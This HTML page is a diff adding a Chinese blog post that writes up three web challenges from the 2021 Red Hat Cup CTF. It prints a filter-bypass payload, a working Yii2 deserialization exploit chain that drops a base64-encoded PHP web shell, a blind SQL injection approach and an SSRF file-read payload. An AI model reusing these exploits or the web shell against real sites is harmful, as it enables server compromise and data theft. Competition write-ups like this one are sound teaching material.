@@ -1,0 +1,228 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#000000"><meta name="author" content="gyy"><meta name="copyright" content="gyy"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>红帽杯2021 | Err0r</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => <!-- hexo-inject:begin --><!-- hexo-inject:end -->{
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#000000"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"err0r.top","root":"/","title":"浅伴独蓝的小站","version":"1.5.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"想要搜些什么？","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Err0r" type="application/atom+xml"><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><meta name="description" content="Web体验还行，不是太难，压轴题很合理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红帽杯2021">
+<meta property="og:url" content="https://err0r.top/article/redhat2021/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="Web体验还行，不是太难，压轴题很合理">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509205559176.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509210754051.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/36771C01-40D6-4C62-A2C3-A38B1D6CE696.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509211521847.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509211350611.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509212002489.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509212509022.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509212527090.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509212645414.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509213045341.png">
+<meta property="og:image" content="https://err0r.top/article/redhat2021/image-20210509213219524.png">
+<meta property="article:published_time" content="2021-05-09T12:43:09.000Z">
+<meta property="article:modified_time" content="2021-05-09T13:32:32.945Z">
+<meta property="article:author" content="gyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://err0r.top/article/redhat2021/image-20210509205559176.png"><script src="/js/ui/mode.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="gyy"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="gyy"></a><div class="site-author-name"><a href="/about/">gyy</a></div><a class="site-name" href="/about/site.html">Err0r</a><sub class="site-subtitle">gyy</sub><div class="site-desciption">gugugu</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">28</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">5</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">10</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ MTkwNjk2ODc2NA==" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Err0rCM" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/8408670" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:err0rcm@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.now.sh/" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-send-plane-2-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们|友情链接" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-it"><span class="toc-number">1.1.</span> <span class="toc-text">find_it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#framework"><span class="toc-number">1.2.</span> <span class="toc-text">framework</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.</span> <span class="toc-text">Yii2反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebsiteManger"><span class="toc-number">1.3.</span> <span class="toc-text">WebsiteManger</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://err0r.top/article/redhat2021/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="gyy"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Err0r"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">红帽杯2021</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-05-09 20:43:09" itemprop="dateCreated datePublished" datetime="2021-05-09T20:43:09+08:00">2021-05-09</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">735</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">3m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="评论数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-chat-3-line"></use></svg> <span class="waline-comment-count" id="/article/redhat2021/"></span></span></a><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#000000;"><p>Web体验还行，不是太难，压轴题很合理</p>
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><a id="more"></a>
+
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>题目没啥意思23333，还老是503</p>
+<p>扫下目录，访问<code>robots.txt</code> ，得到<code>1ndexx.php</code>，访问页面500报错，应该是缺参数，既然这样那肯定要给源码(不然寄刀片伺候)</p>
+<p>发现备份文件<code>.1ndexx.php.swp</code></p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token shell-comment comment">#Really easy...</span>
+
+<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>ban了一堆函数，先看看phpinfo</p>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">./?code=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+
+<p>访问<code>hack.php</code></p>
+<p>搜索字符串，结果发现flag写在了环境变量里，被phpinfo暴露出来了</p>
+<img src="/article/redhat2021/image-20210509205559176.png" class="" title="web1flag" loading="lazy">
+
+<p>说实话，<code>1ndexx.php</code>和<code>index.php</code> 切换迷惑人，然后平台的问题，盲猜docker分发写环境变量，最后没删23333</p>
+<hr>
+<h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>扫到<code>www.zip</code>，看下是<a target="_blank" rel="noopener" href="http://github.com/yiisoft/yii2/">Yii Framework2.0.32</a></p>
+<p>去官网下原版比对一下，发现就改了个参数</p>
+<h4 id="Yii2反序列化漏洞"><a href="#Yii2反序列化漏洞" class="headerlink" title="Yii2反序列化漏洞"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/thresh/p/13743081.html">Yii2反序列化漏洞</a></h4><p>拿poc直接打，由于base64后可能会有<code>/</code>或者<code>+</code>等，所以先base64一下写函数解码即可</p>
+<p>system似乎被ban了不行</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name">CreateAction</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'assert'</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"file_put_contents('1.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYV0pPz4='))"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">Generator</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token comment">// 这里需要改为isRunning</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// poc2</span>
+<span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name">RunProcess</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">// 生成poc</span>
+    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>这里原poc打的参数是data，这里修改为message</p>
+<img src="/article/redhat2021/image-20210509210754051.png" class="" title="message" loading="lazy">
+
+<p>打过去就行，虽然报错但是已经执行了</p>
+<img src="/article/redhat2021/36771C01-40D6-4C62-A2C3-A38B1D6CE696.png" class="" title="poc" loading="lazy">
+
+<p>在当前目录会生成<code>1.php</code>，蚁剑连一下</p>
+<img src="/article/redhat2021/image-20210509211521847.png" class="" title="getshell" loading="lazy">
+
+<p>发现有disable_function，当时心凉一截，不会和蓝帽一样…</p>
+<p>侥幸心理测了下蚁剑的突破插件，发现<code>Apache_mod_cgi</code>可以，执行根目录下<code>/readflag</code>即可</p>
+<img src="/article/redhat2021/image-20210509211350611.png" class="" title="web2flag" loading="lazy">
+
+
+
+<hr>
+<h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>打开登陆界面，估计是注入</p>
+<p>看看连接，发现异常请求，还好没上来对着<code>username</code>乱试</p>
+<img src="/article/redhat2021/image-20210509212002489.png" class="" title="imagephp" loading="lazy">
+
+<p>经测试，可以使用异或 盲注</p>
+<pre class="language-none"><code class="language-none">错误语句返回报错
+正确语句错误表达返回：WHAT ARE YOU DOING
+正确语句id为1返回图片
+正确语句id为0返回空</code></pre>
+
+<img src="/article/redhat2021/image-20210509212509022.png" class="" title="1^1" loading="lazy">
+
+<img src="/article/redhat2021/image-20210509212527090.png" class="" title="1^0" loading="lazy">
+
+<img src="/article/redhat2021/image-20210509212645414.png" class="" title="error" loading="lazy">
+
+<p>异或盲注脚本跑，可见以前写的WP</p>
+<p>拿到信息如下</p>
+<pre class="language-none"><code class="language-none"># version&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;5.5.60-0+deb8u1
+# databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf
+# tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;images,users
+# users.columns&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;username,password
+# users.data&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;admin~a1d4f79c94f0cd3feeac4</code></pre>
+
+<p>似乎密码还是容器随机的，拿到用户名密码登陆</p>
+<img src="/article/redhat2021/image-20210509213045341.png" class="" title="ssrf" loading="lazy">
+
+<p>明显ssrf，用file协议读一下文件可行，直接读flag</p>
+<p>payload：</p>
+<pre class="language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;flag</code></pre>
+
+<img src="/article/redhat2021/image-20210509213219524.png" class="" title="web3flag" loading="lazy">
+
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>gyy</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://err0r.top/article/redhat2021/" title="红帽杯2021">https://err0r.top/article/redhat2021/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/article/bluehat2021/" rel="next" title="蓝帽杯2021一道题——One_Pointer_PHP"><span class="post-nav-text">蓝帽杯2021一道题——One_Pointer_PHP</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>若您想及时得到回复提醒，建议私发邮件联系。</span><br><span>评论请遵守评论公德，博主会不定时检查评论并进行回复。</span><br></div><div id="waline"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js", () => {
+  const walineConfig = {"enable":true,"serverURL":"https://comments-err0rcm.vercel.app","comment":true,"visitor":false,"el":"#waline","lang":"zh-CN"}
+  walineConfig.path = "/article/redhat2021/"
+  new Waline(walineConfig)
+}, window.Waline);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备20028116号-1</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> gyy</span></div><div class="live_time"><span>本博客已在各种灾难中运行了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2020-10-20T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#000000" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="想要搜些什么？" value=""></div><div id="local-search-result"></div></div><script>const date = new Date();
+const today = (date.getMonth() + 1) + "-" + date.getDate()
+const mourn_days = ["4-4","9-18","12-13"]
+if (mourn_days.includes(today)) {
+  document.documentElement.style.filter = "grayscale(1)";
+}</script></div><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></html>
